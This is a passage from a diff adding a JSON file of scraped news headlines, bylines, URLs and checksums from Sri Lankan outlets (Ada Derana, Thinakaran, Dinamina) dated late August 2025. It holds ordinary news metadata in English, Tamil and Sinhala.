+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111957",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "6d6cfc4838668d5993b8dcea86be345a48d759cfb404976347f289a52c85c3ab"
+      },
+      {
+        "title": "Floods affect 1.2 million, displace nearly 250,000 in eastern Pakistan",
+        "href": "https://www.adaderana.lk/news.php?nid=111954",
+        "byline": "Rescuers in boats raced to reach stranded families in Pakistan’s populous eastern Punjab province on Thursday, after three major rivers burst their banks because of heavy rain and the release of water from overflowing dams in neighbouring India.",
+        "timestamp": "August 28, 2025  4:59 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111954",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "07d8b4489a3639d0ffd5fcf89919ea77a2e6a6c58d5c078c85b14766eb0086a6"
+      },
+      {
+        "title": "A special court to try organized criminals - Public Security Minister",
+        "href": "https://www.adaderana.lk/news.php?nid=111939",
+        "byline": "The Sri Lankan government has decided to establish a special court to try organized criminals and expedite the cases against them, says Minister of Public Security Ananda Wijepala.",
+        "timestamp": "August 28, 2025  1:24 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111939",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "135b96fc8139083917a6c5a5a52100b436130cd69df5f53714260abe6e98fdf6"
+      },
+      {
+        "title": "SLAF warns against kite flying near airports",
+        "href": "https://www.adaderana.lk/news.php?nid=111945",
+        "byline": "The Sri Lanka Air Force (SLAF) has warned the public regarding the potential dangers to aircraft operations associated with kite flying, which is a popular activity in the country these days.",
+        "timestamp": "August 28, 2025  2:50 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111945",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "40561e9930460a4ba74e28b63893b762bc000f3c1d526f10bf8dd403fc2df0f2"
+      },
+      {
+        "title": "Colombo HC issues notices to hear Rajitha’s revision petition",
+        "href": "https://www.adaderana.lk/news.php?nid=111942",
+        "byline": "The Colombo High Court today (28) issued a notice to consider the revision petition filed by former Minister Rajitha Senaratne, seeking an order to suspend the arrest warrant issued by the Colombo Magistrate’s Court to take him into custody.",
+        "timestamp": "August 28, 2025  1:51 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111942",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "ec842fab7e8bac3e5f0c507d2543d9e3973f939a59103870b6a05e7c4cd3ac9a"
+      },
+      {
+        "title": "Putin, Kim Jong Un to attend Chinese parade in show of defiance to the West",
+        "href": "https://www.adaderana.lk/news.php?nid=111934",
+        "byline": "Russian President Vladimir Putin and North Korea’s Kim Jong Un will attend a military parade in Beijing, marking the first public appearance of the two leaders alongside President Xi Jinping in a show of collective defiance amid Western pressure.",
+        "timestamp": "August 28, 2025  10:28 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111934",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "5fc7cd902a10ca4953920c274a37e73cc0848454c31af33d19e59e360194f836"
+      },
+      {
+        "title": "Details of major underworld figures arrested in Indonesia during joint operation revealed",
+        "href": "https://www.adaderana.lk/news.php?nid=111937",
+        "byline": "Six individuals including five members of Sri Lanka’s top underworld figures and a woman have been arrested in a joint operation conducted by a special Sri Lankan Criminal Investigation Department (CID) team and the Indonesian Police in Jakarta, Indonesia.",
+        "timestamp": "August 28, 2025  12:12 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111937",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "a1fb27d317363914969ca04f56b59e5265b873df284882669c0119f00c183f71"
+      },
+      {
+        "title": "Japanese town proposes two-hour daily limit on smartphones",
+        "href": "https://www.adaderana.lk/news.php?nid=111944",
+        "byline": "A central Japanese town wants to limit smartphone use for all its 69,000 residents to two hours a day, in a move that has sparked intense debate on device addiction.",
+        "timestamp": "August 28, 2025  2:18 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111944",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "f4cdc7d76e94c96e7d8173e981c0aff343e028016c238523a2112aff4d9b2195"
+      },
+      {
+        "title": "Tragic school van accident: Tipper truck driver remanded",
+        "href": "https://www.adaderana.lk/news.php?nid=111941",
+        "byline": "The driver of the tipper truck, which collided head-on with a school van in the Kuliyapitiya area on August 27, killing three persons including two schoolgirls, has been remanded after being produced before court.",
+        "timestamp": "August 28, 2025  1:39 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111941",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "967999060e1c176871f139c03f8d5b81857cecd6944e85735a14ca5ccc5f609a"
+      },
+      {
+        "title": "Vehicular movement restricted along Colombo - Kandy main road in Warakapola",
+        "href": "https://www.adaderana.lk/news.php?nid=111956",
+        "byline": "Vehicular movement along the Colombo –Kandy will be restricted due to the Deva Perahera held at the ancient Sri Pattini Devalaya in Rangala Cave, Ambepussa, Warakapola.",
+        "timestamp": "August 28, 2025  5:46 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111956",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "9cc12ca080f599eada959a4629e26a41afc5bca13edc2d53362d8328d0c75d6a"
+      },
+      {
+        "title": "Ven. Narampanawa Ananda Thero elected as Anunayake of the Asgiri Chapter",
+        "href": "https://www.adaderana.lk/news.php?nid=111950",
+        "byline": "Venerable Narampanawa Ananda Thero has been elected as the Anunayake of the Asgiri Chapter.",
+        "timestamp": "August 28, 2025  4:00 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111950",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "3afef9b429f32bfaa3ee176f7ec738dabff13bab40d66277624cf7e435ca6604"
+      },
+      {
+        "title": "Suspect arrested for injuring police officer during protest near Colombo Fort Magistrate’s Court",
+        "href": "https://www.adaderana.lk/news.php?nid=111930",
+        "byline": "A suspect has been arrested for injuring a police officer during a protest near the Colombo Fort Magistrate’s Court on August 26.",
+        "timestamp": "August 28, 2025  9:09 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111930",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "169e65914bb77fce50cfe17ed655f72fc068a5ac8a2c87a2308a01b5de8d707e"
+      },
+      {
+        "title": "Argentina hunts allegedly Nazi-looted painting spotted in ad",
+        "href": "https://www.adaderana.lk/news.php?nid=111953",
+        "byline": "Authorities in Argentina are searching for an 18th-century Italian portrait believed to have been looted by a fugitive Nazi officer 80 years ago.",
+        "timestamp": "August 28, 2025  4:52 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111953",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "fba14d8b759c5a7ada5db2d2849d4cab8fcd0a7c0e3167ed2b0430ac020932ab"
+      },
+      {
+        "title": "Ex-President Ranil still in ICU, no decision on date of discharge",
+        "href": "https://www.adaderana.lk/news.php?nid=111943",
+        "byline": "Former President Ranil Wickremesinghe, who was arrested on charges of misappropriation of state funds and later released on bail, is still receiving treatment at the Intensive Care Unit of the Colombo National Hospital.",
+        "timestamp": "August 28, 2025  2:05 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111943",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "685020144c141172e448864bd3e7fa1ef90eabb975debe86f21b654b547ba890"
+      },
+      {
+        "title": "Trump administration moves to tighten duration of visas for students and media",
+        "href": "https://www.adaderana.lk/news.php?nid=111932",
+        "byline": "The Trump administration aims to tighten the duration of visas for students, cultural exchange visitors and members of the media, according to a proposed government regulation issued on Wednesday, part of a broader crackdown on legal immigration.",
+        "timestamp": "August 28, 2025  9:58 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111932",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "a3022809ab18eeaa3c24fb7ca7d9c22dab40da84215188150ee638bd0ade4363"
+      },
+      {
+        "title": "‘No one is above the law’: Govt committed to ensure everyone is held accountable - Public Security Minister",
+        "href": "https://www.adaderana.lk/news.php?nid=111936",
+        "byline": "Minister of Public Security Ananda Wijepala revealed that the major Sri Lankan underworld figures, including ‘Kehelbaddara Padme’ and ‘Commando Salinda,’ who were arrested in Jakarta, Indonesia, will be repatriated to the country within the next two to three days.",
+        "timestamp": "August 28, 2025  12:11 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111936",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "0df459c73c0097fede29464c882e62c195005ba1167003c47b0d040c75c2a4b8"
+      },
+      {
+        "title": "‘Kehelbaddara Padme’ and ‘Commando Salinda’ among 6 underworld figures arrested in Indonesia",
+        "href": "https://www.adaderana.lk/news.php?nid=111927",
+        "byline": "A total of six Sri Lankan underworld figures, including ‘Kehelbaddara Padme’ and ‘Commando Salinda’, have been arrested in Jakarta, Indonesia, Police Media Spokesperson ASP F.U. Wootler said.",
+        "timestamp": "August 28, 2025  6:58 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111927",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "adcfd16cdcf5060ef96da86172861afdb6dc1df454c68ee23aa9654b9dff626f"
+      },
+      {
+        "title": "Election for vacant Anunayake position of Asgiri Chapter to be held today",
+        "href": "https://www.adaderana.lk/news.php?nid=111931",
+        "byline": "The election to fill the vacant position of Anunayake of the Asgiri Chapter will be held today (August 28) at 2.00 PM at the historic ‘Pohoyage’ of the Asgiri Maha Viharaya in Kandy.",
+        "timestamp": "August 28, 2025  9:44 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111931",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "e18af160a726d3822839ca50e1398bace8e012c8d8d8c3cb8a92284ad2ba3af1"
+      },
+      {
+        "title": "Shooter kills two Minneapolis school children in Catholic church, wounds 17 others",
+        "href": "https://www.adaderana.lk/news.php?nid=111926",
+        "byline": "An assailant armed with three guns fired through stained-glass windows into a Catholic church where parish school students were attending Mass on Wednesday, killing two children and wounding 17 other people, officials said.",
+        "timestamp": "August 28, 2025  6:42 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111926",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "3d705717cc81bf468a952d032bbfd9b8cc6b8e652e2c063d99c8f8ce0a5e4816"
+      },
+      {
+        "title": "Several arrested for killing pregnant spotted deer in Wilpattu National Park",
+        "href": "https://www.adaderana.lk/news.php?nid=111961",
+        "byline": "A total of five individuals have been arrested today by wildlife officers for allegedly shooting and killing a pregnant spotted deer within the Wilpattu National Park.",
+        "timestamp": "August 28, 2025  9:38 pm",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111961",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "7a5ed420e58b8e58b1badd39ccb4a2ba513ad05e3bdb62cb6175acc929cf3695"
+      },
+      {
+        "title": "Nissan builds the final R35 GT-R after 18 years of production",
+        "href": "https://www.adaderana.lk/news.php?nid=111893",
+        "byline": "After 18 years and almost 48,000 units made, Nissan has built the final R35 GT-R at its plant in Tochigi, Japan. The concluding R35 was assembled as a T-Spec and finished in Midnight Purple—a signature color in the GT-R’s history.",
+        "timestamp": "August 27, 2025  10:02 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111893",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "877d67d7a02bc59ad286adc8dd0aa39ec33e4aa95a7f35e9efeb8f9bf5470980"
+      },
+      {
+        "title": "US imposes 50% tariff on Indian goods starting today, Modi says buy local",
+        "href": "https://www.adaderana.lk/news.php?nid=111883",
+        "byline": "The US has imposed a new 50% tariff on Indian-origin goods starting Wednesday, August 27.",
+        "timestamp": "August 27, 2025  5:41 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111883",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "71380b98cd4fa684e3924eb75a2464814039752bb46b5f2a4aa3ce6236b2718f"
+      },
+      {
+        "title": "Three Sri Lankans arrested at BIA with foreign cigarettes worth Rs. 45M",
+        "href": "https://www.adaderana.lk/news.php?nid=111892",
+        "byline": "Three Sri Lankans have been arrested at the BIA this morning while attempting to smuggle a large stock of foreign-manufactured cigarettes into the country.",
+        "timestamp": "August 27, 2025  9:48 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111892",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "2d89b31e5b6c275874ae0b6be58b879b71081207c07a794426b4c82cc940cac6"
+      },
+      {
+        "title": "Three including two school children killed in Kuliyapitiya accident",
+        "href": "https://www.adaderana.lk/news.php?nid=111889",
+        "byline": "A total of three persons including two children have died in a road accident in Kuliyapitiya this morning (27), police said.",
+        "timestamp": "August 27, 2025  8:34 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111889",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "623b1a64d9eb7b3897665f6ce087e54dcd095d43834a7118779850e0d62649e0"
+      },
+      {
+        "title": "Taylor Swift and Travis Kelce get engaged after two-year romance",
+        "href": "https://www.adaderana.lk/news.php?nid=111891",
+        "byline": "Pop superstar Taylor Swift and National Football League player Travis Kelce are engaged to be married, the couple announced on social media on Tuesday.",
+        "timestamp": "August 27, 2025  9:34 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111891",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "fbe3a1a0e09dc29087ca7c6c841c7c8124b234bbb908f776e0d152e77786289e"
+      },
+      {
+        "title": "30 killed in landslides in India’s Jammu and Kashmir",
+        "href": "https://www.adaderana.lk/news.php?nid=111890",
+        "byline": "At least 30 people have lost their lives after heavy rains triggered a massive landslide near the Vaishno Devi shrine in Katra, Jammu and Kashmir in India, news agency ANI reported.",
+        "timestamp": "August 27, 2025  9:32 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111890",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "5c60dc750895e5a0bbeaa68ad7ab32f5b600033c62e1d455ab34f8a2d181adb3"
+      },
+      {
+        "title": "Several spells of showers expected in various parts of the country today",
+        "href": "https://www.adaderana.lk/news.php?nid=111882",
+        "byline": "Several spells of showers are expected in the Western and Sabaragamuwa provinces and in the Galle, Matara, Kandy and Nuwara-Eliya districts today, the Department of Meteorology said.",
+        "timestamp": "August 27, 2025  5:39 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111882",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "d07f062e8383f04dfdaa55b4aee9aea146c23c7792c4ca4f519e1b43b4839804"
+      },
+      {
+        "title": "How to effectively communicate using Facebook and WhatsApp? State workers given training",
+        "href": "https://www.adaderana.lk/news.php?nid=111886",
+        "byline": "Meta launched a Digital Government Day program to upskill media secretaries and representatives of state media institutions, in partnership with the Ministry of Digital Economy and the Information and Communication Technology Agency.",
+        "timestamp": "August 27, 2025  6:54 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111886",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "078431d900d65db9f399ab57218c392195ec99bcf3e378146fd7a207fff51755"
+      },
+      {
+        "title": "Man fatally assaulted – Navy personnel taken into custody",
+        "href": "https://www.adaderana.lk/news.php?nid=111888",
+        "byline": "A 59-year-old has been fatally assaulted in Makulugaswewa, Galewela, police stated.",
+        "timestamp": "August 27, 2025  7:48 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111888",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "6d495b6d2f97fda11bc54e97cc32e9e197cac8c69b26d1e7de94beb7ce9fe4c7"
+      },
+      {
+        "title": "UN demands justice over Israeli double strike on Gaza hospital",
+        "href": "https://www.adaderana.lk/news.php?nid=111887",
+        "byline": "The UN has said “there needs to be justice” following Israel’s double strike on a Gaza hospital which killed at least 20 people, as an initial Israeli military probe said the strike had targeted a “camera positioned by Hamas”.",
+        "timestamp": "August 27, 2025  7:04 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111887",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "6160cd6be98dcc14a709defcaf437dd8cb0a15c34f25e174925e1de4d1fc466a"
+      },
+      {
+        "title": "Ex-President Ranil should undergo immediate heart surgery – Dr. Rukshan Bellana",
+        "href": "https://www.adaderana.lk/news.php?nid=111884",
+        "byline": "Dr Rukshan Bellana, the Deputy Director of the Colombo National Hospital says that it is appropriate to refer former President Ranil Wickremesinghe for urgent heart surgery.",
+        "timestamp": "August 27, 2025  5:47 am",
+        "isoTimestamp": "2025-08-29T02:32:55+05:30",
+        "url": "https://www.adaderana.lk/news.php?nid=111884",
+        "baseUrl": "https://adaderana.lk",
+        "checkSum": "2f07e91e0ca70b8873b113369f36ad1b2fa934422644eafa60ea77524273a1c9"
+      }
+    ]
+  },
+  "aruna": {
+    "success": true,
+    "data": []
+  },
+  "themorning": {
+    "success": false,
+    "error": {}
+  },
+  "thamilan": {
+    "success": false,
+    "error": {}
+  },
+  "thinakaran": {
+    "success": true,
+    "data": [
+      {
+        "title": "பட்டதாரிகளுக்கான ஆசிரியர் போட்டிப் பரீட்சை விரைவில்",
+        "url": "https://www.thinakaran.lk/2025/08/28/breaking-news/149674/%e0%ae%aa%e0%ae%9f%e0%af%8d%e0%ae%9f%e0%ae%a4%e0%ae%be%e0%ae%b0%e0%ae%bf%e0%ae%95%e0%ae%b3%e0%af%81%e0%ae%95%e0%af%8d%e0%ae%95%e0%ae%be%e0%ae%a9-%e0%ae%86%e0%ae%9a%e0%ae%bf%e0%ae%b0%e0%ae%bf%e0%ae%af/",
+        "timestamp": "2025-08-28T20:34:38+05:30",
+        "checkSum": "b1b0019dacd37a5eb4e272790c37fec6a320a1a8ef50c28e0015fa3270de7135",
+        "baseUrl": "https://www.thinakaran.lk",
+        "isoTimestamp": "2025-08-28T20:34:38+05:30"
+      },
+      {
+        "title": "காணாமல் ஆக்கப்பட்டோர் தின போராட்டத்திற்கு ஒத்துழைப்பு தாருங்கள்",
+        "url": "https://www.thinakaran.lk/2025/08/28/breaking-news/149667/%e0%ae%95%e0%ae%be%e0%ae%a3%e0%ae%be%e0%ae%ae%e0%ae%b2%e0%af%8d-%e0%ae%86%e0%ae%95%e0%af%8d%e0%ae%95%e0%ae%aa%e0%af%8d%e0%ae%aa%e0%ae%9f%e0%af%8d%e0%ae%9f%e0%af%8b%e0%ae%b0%e0%af%8d-%e0%ae%a4%e0%ae%bf/",
+        "timestamp": "2025-08-28T18:27:40+05:30",
+        "checkSum": "c35c99705225d57a1e1ea54854d1dcd94ae7228876f4afef02e6be5620a96257",
+        "baseUrl": "https://www.thinakaran.lk",
+        "isoTimestamp": "2025-08-28T18:27:40+05:30"
+      },
+      {
+        "title": "பாடசாலை பருவ கொடுமைப்படுத்தல்; நடிகையிடம் நஷ்டஈடு கேட்டு வழக்கு",
+        "url": "https://www.thinakaran.lk/2025/08/28/world/149503/%e0%ae%aa%e0%ae%be%e0%ae%9f%e0%ae%9a%e0%ae%be%e0%ae%b2%e0%af%88-%e0%ae%aa%e0%ae%b0%e0%af%81%e0%ae%b5-%e0%ae%95%e0%af%8a%e0%ae%9f%e0%af%81%e0%ae%ae%e0%af%88%e0%ae%aa%e0%af%8d%e0%ae%aa%e0%ae%9f%e0%af%81/",
+        "timestamp": "2025-08-28T18:27:27+05:30",
+        "checkSum": "3ea1bc8f54a4195df12bcc5012bdb215efb13f1ed8ffb48eaaf3f0ec8dcb3aef",
+        "baseUrl": "https://www.thinakaran.lk",
+        "isoTimestamp": "2025-08-28T18:27:27+05:30"
+      },
+      {
+        "title": "தம்பிலுவில் மயானத்தை அண்டிய பகுதிகளில் மீண்டும் 2ஆம் கட்ட அகழ்வு பணிகள்",
+        "url": "https://www.thinakaran.lk/2025/08/28/crime/149664/%e0%ae%a4%e0%ae%ae%e0%af%8d%e0%ae%aa%e0%ae%bf%e0%ae%b2%e0%af%81%e0%ae%b5%e0%ae%bf%e0%ae%b2%e0%af%8d-%e0%ae%ae%e0%ae%af%e0%ae%be%e0%ae%a9%e0%ae%a4%e0%af%8d%e0%ae%a4%e0%af%88-%e0%ae%85%e0%ae%a3%e0%af%8d/",
+        "timestamp": "2025-08-28T16:43:41+05:30",
+        "checkSum": "9b84dc5a29f2762dc0fe23621f415659d607c5a2c59bcb1d3cc39a0bb9727842",
+        "baseUrl": "https://www.thinakaran.lk",
+        "isoTimestamp": "2025-08-28T16:43:41+05:30"
+      },
+      {
+        "title": "அறுகம்பை குடாவில் அதிகரித்துள்ள உல்லாசப் பயணிகளின் வருகை",
+        "url": "https://www.thinakaran.lk/2025/08/28/breaking-news/149659/%e0%ae%85%e0%ae%b1%e0%af%81%e0%ae%95%e0%ae%ae%e0%af%8d%e0%ae%aa%e0%af%88-%e0%ae%95%e0%af%81%e0%ae%9f%e0%ae%be%e0%ae%b5%e0%ae%bf%e0%ae%b2%e0%af%8d-%e0%ae%85%e0%ae%a4%e0%ae%bf%e0%ae%95%e0%ae%b0%e0%ae%bf/",
+        "timestamp": "2025-08-28T16:34:19+05:30",
+        "checkSum": "059da6d8ff5ff1fd2ffe44014a53c1b43bf4cf86fa808875d60298dd7094dc89",
+        "baseUrl": "https://www.thinakaran.lk",
+        "isoTimestamp": "2025-08-28T16:34:19+05:30"
+      },
+      {
+        "title": "மகாராஷ்டிராவில் அடுக்குமாடி குடியிருப்பு இடிந்து விபத்து: 15 பேர் பலி",
+        "url": "https://www.thinakaran.lk/2025/08/28/breaking-news/149656/%e0%ae%ae%e0%ae%95%e0%ae%be%e0%ae%b0%e0%ae%be%e0%ae%b7%e0%af%8d%e0%ae%9f%e0%ae%bf%e0%ae%b0%e0%ae%be%e0%ae%b5%e0%ae%bf%e0%ae%b2%e0%af%8d-%e0%ae%85%e0%ae%9f%e0%af%81%e0%ae%95%e0%af%8d%e0%ae%95%e0%af%81/",
+        "timestamp": "2025-08-28T16:13:41+05:30",
+        "checkSum": "9db3c54e76ce13d0ca3a1802a823ea49d5343ed5cf8e82596e60d8bec9cc5920",
+        "baseUrl": "https://www.thinakaran.lk",
+        "isoTimestamp": "2025-08-28T16:13:41+05:30"
+      },
+      {
+        "title": "பிடியாணைக்கு எதிரான ராஜிதவின் மனு செப். 10 விசாரணைக்கு",
+        "url": "https://www.thinakaran.lk/2025/08/28/breaking-news/149651/%e0%ae%aa%e0%ae%bf%e0%ae%9f%e0%ae%bf%e0%ae%af%e0%ae%be%e0%ae%a3%e0%af%88%e0%ae%95%e0%af%8d%e0%ae%95%e0%af%81-%e0%ae%8e%e0%ae%a4%e0%ae%bf%e0%ae%b0%e0%ae%be%e0%ae%a9-%e0%ae%b0%e0%ae%be%e0%ae%9c%e0%ae%bf/",
+        "timestamp": "2025-08-28T15:50:24+05:30",
+        "checkSum": "5a314b3877bfb852db47fe4421ec40b97bb82ed56a6e57c259844f07b6360c4a",
+        "baseUrl": "https://www.thinakaran.lk",
+        "isoTimestamp": "2025-08-28T15:50:24+05:30"
+      },
+      {
+        "title": "குளியாப்பிட்டி விபத்து; டிப்பர் சாரதிக்கு செப். 08 வரை விளக்கமறியல்",
+        "url": "https://www.thinakaran.lk/2025/08/28/breaking-news/149647/%e0%ae%95%e0%af%81%e0%ae%b3%e0%ae%bf%e0%ae%af%e0%ae%be%e0%ae%aa%e0%af%8d%e0%ae%aa%e0%ae%bf%e0%ae%9f%e0%af%8d%e0%ae%9f%e0%ae%bf-%e0%ae%b5%e0%ae%bf%e0%ae%aa%e0%ae%a4%e0%af%8d%e0%ae%a4%e0%af%81/",
+        "timestamp": "2025-08-28T15:21:47+05:30",
+        "checkSum": "9c9a39099f3bb4be54eaedf6884d19c71228d0cf52ec11891b3294e0111934e3",
+        "baseUrl": "https://www.thinakaran.lk",
+        "isoTimestamp": "2025-08-28T15:21:47+05:30"
+      },
+      {
+        "title": "பிரிட்டனில் புலம்பெயர்ந்தவர்களுக்கு ஆதரவாகவும் எதிராகவும் போராட்டங்கள்",
+        "url": "https://www.thinakaran.lk/2025/08/28/world/149505/%e0%ae%aa%e0%ae%bf%e0%ae%b0%e0%ae%bf%e0%ae%9f%e0%af%8d%e0%ae%9f%e0%ae%a9%e0%ae%bf%e0%ae%b2%e0%af%8d-%e0%ae%aa%e0%af%81%e0%ae%b2%e0%ae%ae%e0%af%8d%e0%ae%aa%e0%af%86%e0%ae%af%e0%ae%b0%e0%af%8d%e0%ae%a8/",
+        "timestamp": "2025-08-28T15:19:00+05:30",
+        "checkSum": "9805370ea6f1402bfc2b3c0b9f66be8205df436f63583ea713ac776649fb60bc",
+        "baseUrl": "https://www.thinakaran.lk",
+        "isoTimestamp": "2025-08-28T15:19:00+05:30"
+      },
+      {
+        "title": "“தேசிய ஆராய்ச்சி முன்னுரிமை அறிக்கை” ஜனாதிபதியின் செயலாளரிடம் கையளிப்பு",
+        "url": "https://www.thinakaran.lk/2025/08/28/breaking-news/149643/%e0%ae%a4%e0%af%87%e0%ae%9a%e0%ae%bf%e0%ae%af-%e0%ae%86%e0%ae%b0%e0%ae%be%e0%ae%af%e0%af%8d%e0%ae%9a%e0%af%8d%e0%ae%9a%e0%ae%bf-%e0%ae%ae%e0%af%81%e0%ae%a9%e0%af%8d%e0%ae%a9%e0%af%81%e0%ae%b0/",
+        "timestamp": "2025-08-28T15:01:24+05:30",
+        "checkSum": "3bd56f106bafddbd853a939df63ad185b7fe863b493566b58b4c3b1a911607a8",
+        "baseUrl": "https://www.thinakaran.lk",
+        "isoTimestamp": "2025-08-28T15:01:24+05:30"
+      }
+    ]
+  },
+  "dinamina": {
+    "success": true,
+    "data": [
+      {
+        "title": "යුක්රේන අගනුවරට රුසියාවෙන් දැවැන්ත ගුවන් ප්‍රහාරයක්",
+        "url": "https://www.dinamina.lk/2025/08/29/foreign/217524/%e0%b6%ba%e0%b7%94%e0%b6%9a%e0%b7%8a%e0%b6%bb%e0%b7%9a%e0%b6%b1-%e0%b6%85%e0%b6%9c%e0%b6%b1%e0%b7%94%e0%b7%80%e0%b6%bb%e0%b6%a7-%e0%b6%bb%e0%b7%94%e0%b7%83%e0%b7%92%e0%b6%ba%e0%b7%8f%e0%b7%80%e0%b7%99/",
+        "timestamp": "2025-08-29T01:01:54+05:30",
+        "checkSum": "3f9c8c08582e5f5ffe5f7d216b3c63281d4bf436910d73e317bd5f8fd3a53d7e",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:01:54+05:30"
+      },
+      {
+        "title": "වනිඳු සිම්බාබ්වේ සංචාරයට නෑ: ආසියානු කුසලානයට සූදානම්",
+        "url": "https://www.dinamina.lk/2025/08/29/sports/217421/%e0%b7%80%e0%b6%b1%e0%b7%92%e0%b6%b3%e0%b7%94-%e0%b7%83%e0%b7%92%e0%b6%b8%e0%b7%8a%e0%b6%b6%e0%b7%8f%e0%b6%b6%e0%b7%8a%e0%b7%80%e0%b7%9a-%e0%b7%83%e0%b6%82%e0%b6%a0%e0%b7%8f%e0%b6%bb%e0%b6%ba%e0%b6%a7/",
+        "timestamp": "2025-08-29T01:01:53+05:30",
+        "checkSum": "2ae0e9eb4466894bc42027a31e2360590037a8a54f5b4288ea85e8a4e859313d",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:01:53+05:30"
+      },
+      {
+        "title": "රාජිතගේ වරෙන්තුව අත්හිටුවන්නැයි කළ ඉල්ලීම ප්‍රතික්ෂේපයි",
+        "url": "https://www.dinamina.lk/2025/08/29/lawnorder/217565/%e0%b6%bb%e0%b7%8f%e0%b6%a2%e0%b7%92%e0%b6%ad%e0%b6%9c%e0%b7%9a-%e0%b7%80%e0%b6%bb%e0%b7%99%e0%b6%b1%e0%b7%8a%e0%b6%ad%e0%b7%94%e0%b7%80-%e0%b6%85%e0%b6%ad%e0%b7%8a%e0%b7%84%e0%b7%92%e0%b6%a7/",
+        "timestamp": "2025-08-29T01:00:58+05:30",
+        "checkSum": "0ce5ab265bde79b56021492461da7a1506ca01a348e9da6bbdb2b43b31757180",
+        "baseUrl": "https://www.dinamina.lk",
+        "isoTimestamp": "2025-08-29T01:00:58+05:30"
+      },
+      {
+        "title": "දඩය ගෙවන්න බැරිව හිරේ ගිය රැඳවූවා බන්ධනාගාරයේදී මියයයි",
